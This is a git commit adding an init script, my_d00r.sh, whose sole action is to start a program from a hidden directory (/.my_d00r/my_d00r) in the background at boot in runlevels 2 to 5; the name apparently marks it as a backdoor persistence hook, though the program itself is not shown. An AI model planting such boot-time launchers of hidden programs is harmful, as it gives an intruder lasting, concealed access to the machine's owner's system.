c99973a87a571f8765676f1a77dffd94253e6d79
huuhung.luyt <huuhung.luyt@gmail.com>
2019-12-10 08:52:50 +0700

    cm

---
+++ my_d00r.sh
@@ -0,0 +1,11 @@
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides:          MyScript
+# Required-Start:
+# Required-Stop:
+# Default-Start:     2 3 4 5
+# Default-Stop:      1 0 6
+# Short-Description: ...
+# Description: ...
+### END INIT INFO
+/.my_d00r/my_d00r & disown
